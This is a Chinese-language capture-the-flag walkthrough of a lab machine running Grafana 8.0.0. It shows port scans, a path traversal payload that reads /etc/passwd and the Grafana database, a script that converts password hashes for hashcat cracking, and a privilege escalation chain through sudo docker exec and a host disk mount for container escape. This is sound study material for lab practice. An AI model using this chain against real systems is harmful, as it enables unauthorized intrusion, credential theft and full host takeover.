# 信息收集

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# nmap --min-rate 10000 -p- 10.129.16.155
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 18:01 CST
Nmap scan report for 10.129.16.155 (10.129.16.155)
Host is up (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp

Nmap done: 1 IP address (1 host up) scanned in 11.28 seconds
```
对3000端口进行，版本探测，详细服务识别

```
┌──(root㉿MJ)-[/tmp/test]
└─# nmap -sV -sC -O -p3000 10.129.16.155
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 18:02 CST
Nmap scan report for 10.129.16.155 (10.129.16.155)
Host is up (0.19s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-robots.txt: 1 disallowed entry
|_/
| http-title: Grafana
|_Requested resource was /login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.69 seconds
```
3000端口是Grafana服务，web进一步判断其版本信息，在此处可以看到8.0版本
```bash

curl http://10.129.16.155:3000/ -L | grep 8.0

navTree: [{"id":"dashboards","text":"Dashboards","subTitle":"Manage dashboards and folders","icon":"apps","url":"/","sortWeight":-1900,"children":[{"id":"home","text":"Home","icon":"home-alt","url":"/","hideFromTabs":true},{"id":"divider","text":"Divider","divider":true,"hideFromTabs":true},{"id":"manage-dashboards","text":"Manage","icon":"sitemap","url":"/dashboards"},{"id":"playlists","text":"Playlists","icon":"presentation-play","url":"/playlists"}]},{"id":"alerting","text":"Alerting","subTitle":"Alert rules and notifications","icon":"bell","url":"/alerting/list","sortWeight":-1600,"children":[{"id":"alert-list","text":"Alert rules","icon":"list-ul","url":"/alerting/list"}]},{"id":"help","text":"Help","subTitle":"Grafana v8.0.0 (41f0542c1e)","icon":"question-circle","url":"#","sortWeight":-1200,"hideFromMenu":true}],
```

简单搜索可以发现这个版本的Grafana存在路径穿越漏洞，payload如下
`/public/plugins/<here>/…/…/…/…/…/…/…/…/…/etc/passwd`
`<here>`是占位符，需要替换为已安装的插件，随便一个即可
常见的插件名字有
```text
alertlist
cloudwatch
dashlist
elasticsearch
graph
graphite
heatmap
influxdb
mysql
opentsdb
pluginlist
postgres
prometheus
stackdriver
table
text
```
测试alertlist插件存在

# Web
这里需要加上`--path-as-is`参数，避免被浏览器结合路径处理
```
┌──(root㉿MJ)-[/tmp/test]
└─# curl --path-as-is "http://10.129.16.155:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
```
不过神奇的一点是，所有用户都没有shell环境，同时在hosts文件中我们可以看到这大概率是个docker容器
```
┌──(root㉿MJ)-[/tmp/test]
└─# curl --path-as-is "http://10.129.16.155:3000/public/plugins/alertlist/../../../../../../../../etc/hosts"
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      e6ff5b1cbc85
```

**grafana的配置路径**
```text
/etc/grafana/grafana.ini         #全局配置文件
/usr/local/etc/grafana/grafana.ini         #默认配置文件
/var/lib/grafana/grafana.db         #数据库文件
```
这几个都很有价值，配置文件中可能写有密码字段，但是尝试发现密码已经被修改，这里重点关注数据库文件

```bash
┌──(root㉿MJ)-[/tmp/test]
└─# curl --path-as-is "http://10.129.16.155:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db" --output  sql.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 598016 100 598016   0     0 181176     0   0:00:03  0:00:03 --:--:-- 181162

┌──(root㉿MJ)-[/tmp/test]
└─# file sql.db
sql.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 357, database pages 146, cookie 0x109, schema 4, UTF-8, version-valid-for 357
```
sqlite文件，在user表找到密码hash
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# sqlite3 sql.db

1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0
2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0
```

Grafana的加密算法是**PBKDF2 算法**，hashcat对这种算法的破解只接受base64编码段

运行脚本进行数据转化
```python
import base64
import binascii

# 原始数据
users = [
    {
        "name": "admin",
        "salt": "YObSoLj55S",
        "hex": "7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8"
    },
    {
        "name": "boris",
        "salt": "LCBhdtJWjl",
        "hex": "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
    }
]

print("[-] 请将以下内容保存为 grafana.hash:")
for u in users:
    # 1. 处理 Salt: String -> Base64
    salt_b64 = base64.b64encode(u["salt"].encode()).decode().strip()
    
    # 2. 处理 Hash: 
    # Grafana 哈希长度为 100 hex (50 bytes)。
    # Hashcat -m 10900 通常只比对前 32 bytes (64 hex)。
    # 所以我们截取前 64 个字符，然后转为 Base64。
    hex_32bytes = u["hex"][:64] 
    hash_bin = binascii.unhexlify(hex_32bytes)
    hash_b64 = base64.b64encode(hash_bin).decode().strip()
    
    # 格式: sha256:10000:base64_salt:base64_hash
    print(f"sha256:10000:{salt_b64}:{hash_b64}")
```

hashcat指定10900模式破解，admin密码不是弱密码，最终没能跑出来
```bash
┌──(root㉿MJ)-[/tmp/test]
└─# python3 ez.py
sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMiw=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNM=

┌──(root㉿MJ)-[/tmp/test]
└─# cat hash.txt                                                                                                  sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMiw=
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNM=

┌──(root㉿MJ)-[/tmp/test]
└─# hashcat -m 10900 hash.txt --show
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNM=:beautiful1

```
但是进入web后台没有找到getshell的方法，又因为读取的passwd大概率是docker的passwd所以可以猜测主机凭据复用`boris:beautiful1`，进而拿到立足点

# 提权

```bash
boris@data:~$ sudo -l
Matching Defaults entries for boris on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User boris may run the following commands on localhost:
    (root) NOPASSWD: /snap/bin/docker exec *
boris@data:~$ id
uid=1001(boris) gid=1001(boris) groups=1001(boris)
boris@data:~$
```
可以root执行docker exec，此时最开始的hosts文件就暴露作用了，因为boris不是docker组，所以无法使用docker相关命令，但是通过路径穿越，可以得到一个正在运行的docker实例`e6ff5b1cbc85`

## 关键点

    
`sudo /snap/bin/docker exec -it e6ff5b1cbc85 /bin/sh`
    
这会在容器内以**容器默认用户**打开 shell（很多镜像 Dockerfile 里用 `USER grafana`，所以你看到 uid=472）。
    
但是 `docker exec` 可以**指定用户**来执行命令（`-u` / `--user`）。只要 sudoers 允许 `docker exec *`，你可以把 `-u 0` 传进去让容器内以 root(uid=0) 执行。

所以运行命令`sudo /snap/bin/docker exec -u 0 -it e6ff5b1cbc85 /bin/sh`即可得到容器的root权限

```sh

boris@data:~$ sudo /snap/bin/docker exec -it e6ff5b1cbc85 /bin/sh
/usr/share/grafana $ id
uid=472(grafana) gid=0(root) groups=0(root)
/usr/share/grafana $ cd /root/
/bin/sh: cd: can't cd to /root/: Permission denied
/usr/share/grafana $ exit

boris@data:~$ sudo /snap/bin/docker exec -u 0 -it e6ff5b1cbc85 /bin/sh
/usr/share/grafana # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

## 确定特权容器

### fdisk


```bash
fdisk -l | grep -A 10 -i "device"
```
如果是非特权容器，命令将会被拒绝

```bash
/usr/share/grafana # fdisk -l | grep -A 10 -i "device"
Device  Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
/dev/sda1    4,4,1       1023,254,2        2048   10487807   10485760 5120M 83 Linux
/dev/sda2    1023,254,2  1023,254,2    10487808   12582911    2095104 1023M 82 Linux swap
/usr/share/grafana #
```

### seccomp

```bash
/usr/share/grafana # cat /proc/1/status | grep -i "seccomp"
Seccomp:        0
```
在非特权容器中，我们将分别看到 2 和 1，分别对应seccomp以及seccomp_filters值，通常的进程中的 seccomp 值会有两个，但是此机器只有一个

### dev

可以通过列出dev来判断是否为特权容器

```bash
/usr/share/grafana # ls /dev/
agpgart          mcelog           tty1             tty32            tty55            vcs4
autofs           mem              tty10            tty33            tty56            vcs5
bsg              mqueue           tty11            tty34            tty57            vcs6
btrfs-control    net              tty12            tty35            tty58            vcsa
core             null             tty13            tty36            tty59            vcsa1
cpu_dma_latency  nvram            tty14            tty37            tty6             vcsa2
cuse             port             tty15            tty38            tty60            vcsa3
ecryptfs         ppp              tty16            tty39            tty61            vcsa4
fd               psaux            tty17            tty4             tty62            vcsa5
full             ptmx             tty18            tty40            tty63            vcsa6
fuse             pts              tty19            tty41            tty7             vcsu
hpet             random           tty2             tty42            tty8             vcsu1
hwrng            rfkill           tty20            tty43            tty9             vcsu2
input            rtc0             tty21            tty44            ttyS0            vcsu3
kmsg             sda              tty22            tty45            ttyS1            vcsu4
loop-control     sda1             tty23            tty46            ttyS2            vcsu5
loop0            sda2             tty24            tty47            ttyS3            vcsu6
loop1            sg0              tty25            tty48            ttyprintk        vfio
loop2            shm              tty26            tty49            udmabuf          vga_arbiter
loop3            snapshot         tty27            tty5             uinput           vhost-net
loop4            stderr           tty28            tty50            urandom          vhost-vsock
loop5            stdin            tty29            tty51            vcs              vmci
loop6            stdout           tty3             tty52            vcs1             vsock
loop7            tty              tty30            tty53            vcs2             zero
mapper           tty0             tty31            tty54            vcs3             zfs
```

**在 /dev 中看到大量文件和子目录，证明这是一个特权容器。在非特权容器中，我们不会在其中看到如此多的文件。**

**种种迹象表名，我们就是处于特权容器当中**



## 逃逸

```bash
/usr/share/grafana # df -h
Filesystem                Size      Used Available Use% Mounted on
overlay                   4.8G      1.8G      2.9G  39% /
tmpfs                    64.0M         0     64.0M   0% /dev
tmpfs                   991.8M         0    991.8M   0% /sys/fs/cgroup
shm                      64.0M         0     64.0M   0% /dev/shm
/dev/sda1                 4.8G      1.8G      2.9G  39% /etc/resolv.conf
/dev/sda1                 4.8G      1.8G      2.9G  39% /etc/hostname
/dev/sda1                 4.8G      1.8G      2.9G  39% /etc/hosts
/dev/sda1                 4.8G      1.8G      2.9G  39% /mnt/evil
/usr/share/grafana #
```
可以看到docker挂载到sda1设备下

```bash
/usr/share/grafana # mkdir /mnt/evil
/usr/share/grafana # mount /dev/sda1 /mnt/evil/
/usr/share/grafana # ls -al /mnt/evil/
```
现在就可以和主机交互了，但是并不是主机的root，获取主机的root可以写入公钥，新加root，或者改passwd，shadow等操作

